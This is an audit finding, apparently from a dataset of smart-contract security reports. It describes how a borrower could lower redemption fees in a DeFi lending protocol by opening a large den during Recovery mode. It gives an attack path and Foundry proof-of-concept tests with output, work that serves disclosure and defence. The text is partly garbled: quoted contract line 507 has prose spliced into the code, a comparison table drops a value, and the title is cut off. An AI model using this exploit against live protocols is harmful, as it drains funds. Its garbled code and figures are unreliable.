# [M] Redemption fees can be manipulated dur-

## Summary
Severity: Medium
Contest weight: 0.6842
Dataset id: 2633
Source: https://huggingface.co/datasets/Zaevlad/audit-findings-dataset
Type: audit-finding

## Details
During Recovery mode, the borrowing fees are waived (not charged) when opening a den, this can be taken advantage by a malicious borrower to manipulate the redemption fees. All he can do is to open a den with large debt during recovery mode with no borrowing fees and this will directly affect the redemption rate because redemption rate computation depend on total borrowed amount of the system and collateral being redeemed. The lower the collateral being redeemed compared to total debt of the system, the lower the redemption fees that will be charge for that collateral. Look at the function below in line 507, total debt supply can be inflated in which will lower the redemption rate at the end. This is true specially if the collateral being drawn or redeemed is much smaller compared to total debt of the system. File: DenManager.sol 498: function _updateBaseRateFromRedemption( 499: uint256 _collateralDrawn, 500: uint256 _price, 501: uint256 _totalDebtSupply 502: ) internal returns (uint256) { 503: uint256 decayedBaseRate = _calcDecayedBaseRate(); 504: 505: /* Convert the drawn collateral back to debt at face value rate (1 debt:1 USD), in order to get 506: * the fraction of total supply that was redeemed at face value. */ 507: uint256 redeemedDebtFraction = (_collateralDrawn * _price) / the redemption rate at the end 508: 509: uint256 newBaseRate = decayedBaseRate + (redeemedDebtFraction / BETA); 510: newBaseRate = BeraborrowMath._min(newBaseRate, DECIMAL_PRECISION); // cap baseRate at a maximum of 100% 511: 512: // Update the baseRate state variable 513: baseRate = newBaseRate; 514: emit BaseRateUpdated(newBaseRate); 515: 516: _updateLastFeeOpTime(); 517: 518: return newBaseRate; 519: } 520: The root cause is allowing malicious actor an opportunity to manipulate redemption rate through inflating the total debt of the system through opening a den with large debt. There should be somehow way to discourage them for doing this and the solution will be applying borrowing fees during Recovery mode period. Internal Pre-conditions The system is in recovery mode. External Pre-conditions Attack Path This can be the scenario. 1. An attacker has a remaining open Den in the protocol. Let's call it Den A with 1e18 debt. 2. The protocol enters into Recovery Mode. 3. The attacker knowing the vulnerability, open another Den with very large debt of 1e20. Let's call it Den B 4. Since the total debt of the system increases significantly, this will affect redemption fee rate for redeeming Den A and becomes lower. 5. Attacker take advantage of the situation and redeemed Den A with lower redemption fee. 6. Attacker closes Den B as if nothing happened and system back into original state. Manipulation of redemption fees to lower it. Loss of funds for the protocol

## Proof of Concept
Here are the coded PoCs to show on how the redemption rate becomes lower between PoCs 1. Scenario 1 shows a normal scenario wherein no manipulation happened. No manipulation means no opening of large den before redemption of collateral. The rate increased by 4.5e16 or 4.5%, from 0.5% to 5% equal to max redemption rate of 5%. // Scenario 1 wherein no manipulation happened.
```solidity
function test_redeemRatesDiffA() external {
    // Open Den with 1e18 debt
    _openDen1(depositor);
    // After 12 seconds
    vm.warp(block.timestamp + 12 seconds);
    // Enable recovery mode, price drops to 80% of initial price, 80% because redemption requires TCR >= MCR
    _mockPriceFeed(8e17, block.timestamp, 2);
    // redemption rate before redeem
    uint256 redemptionRatebefore = denManager.getRedemptionRate();
    // depositor perform redemption
    vm.startPrank(depositor);
    // to record the redemption rate during redeem
    vm.recordLogs();
    denManager.redeemCollateral({
        _debtAmount: 1005000003824200913, // to fully redeem den 1
        _firstRedemptionHint: address(0),
        _upperPartialRedemptionHint: address(0),
        _lowerPartialRedemptionHint: address(0),
        _partialRedemptionHintNICR: uint256(0),
        _maxIterations: uint256(0),
        _maxFeePercentage: 5e16 // should match with max redemption rate of 5%
    });
    VmSafe.Log[] memory logss = vm.getRecordedLogs();
    // Parse TCR events and verify difference
    for (uint i = 0; i < logss.length; i++) {
        if (logss[i].topics[0] == keccak256("RedemptionRate(uint256)")) {
            (uint256 redemptionRateafter) = abi.decode(logss[i].data, (uint256));
            console.log("\nRate Increase Summary:");
            console.log("Redemption Rate before redeem:", redemptionRatebefore);
            console.log("Redemption Rate during redeem:", redemptionRateafter);
            console.log("Rate Increased by:", redemptionRateafter - redemptionRatebefore);
        }
    }
}
```
Command to run: forge test -vv --match-contract DenManagerTest --match-test test_redeemRatesDiffA Rate Increase Summary: Redemption Rate before redeem: 5000000000000000 Redemption Rate during redeem: 50000000000000000 Rate Increased by: 45000000000000000 Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 172.69s (2.15s CPU time) 2. Scenario 2 shows the manipulation wherein there is a opening of large den before redemption of collateral. The rate increased only by 4.74e15 or 0.474%, from 0.5% to 0.974%. This is much lower than previous scenario 1. //Scenario 2 wherein manipulation happened. The manipulation here is opening of large den before redemption
```solidity
function test_redeemRatesDiffB() external {
    // Open den with debt of 1e18 by malicious depositor
    _openDen1(depositor);
    // After 12 seconds
    vm.warp(block.timestamp + 12 seconds);
    // Enable recovery mode, price drops to 65% of initial price
    _mockPriceFeed(6.5e17, block.timestamp, 2);
    // redemption fee rate before manipulation
    uint256 redemptionRatebefore = denManager.getRedemptionRate();
    // Open large Den with 1.05e20 debt, manipulation attack through another account by depositor
    _openDen2(random);
    // depositor perform redemption
    vm.startPrank(depositor);
    // to record the redemption rate during redeem
    vm.recordLogs();
    denManager.redeemCollateral({
        _debtAmount: 1005000003824200913, // to fully redeem den 1
        _firstRedemptionHint: address(0),
        _upperPartialRedemptionHint: address(0),
        _lowerPartialRedemptionHint: address(0),
        _partialRedemptionHintNICR: uint256(0),
        _maxIterations: uint256(0),
        _maxFeePercentage: 5e16 // should match with max redemption rate of 5%
    });
    VmSafe.Log[] memory logss = vm.getRecordedLogs();
    // Parse TCR events and verify difference
    for (uint i = 0; i < logss.length; i++) {
        if (logss[i].topics[0] == keccak256("RedemptionRate(uint256)")) {
            (uint256 redemptionRateafter) = abi.decode(logss[i].data, (uint256));
            console.log("\nRate Increase Summary:");
            console.log("Redemption Rate before redeem:", redemptionRatebefore);
            console.log("Redemption Rate during redeem:", redemptionRateafter);
            console.log("Rate Increased by:", redemptionRateafter - redemptionRatebefore);
        }
    }
}
```
Command to run: forge test -vv --match-contract DenManagerTest --match-test test_redeemRatesDiffB Rate Increase Summary: Redemption Rate before redeem: 5000000000000000 Redemption Rate during redeem: 9740342454544336 Rate Increased by: 4740342454544336 Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 163.22s (2.95s CPU time) 3. Compare the two scenarios and the scenario 2 will show much lower increase of redemption rate compare to scenario 1. This is a proof that you can lower the redemption rate by simply inflating the total debt of the system through opening a large den. Description (A) Scenario 1 (B) Scenario 2 (A - B = C) Increase Difference Rate Increased by 4740342454544336 40259657545455664 Let's compute also how much in percentage did the redemption rate change from Scenario 1 to Scenario 2. Increase difference of 40259657545455664 divided by Scenario 1 rate increase of 45000000000000000 is equal to 89.47%. So meaning there is 89.47% reduction in redemption rate after attacker conducts manipulation through opening a den with large debt. The 89.47% represent the loss of the protocol.

## Recommendation
Apply lower borrowing fee during recovery mode. This fee should be lower than the fee imposed during normal mode to make encouragement to still open den during recovery mode. This is the way to incentivize the borrower to open den but discourage malicious attack of manipulating redemption fees. Making the process more balanced.
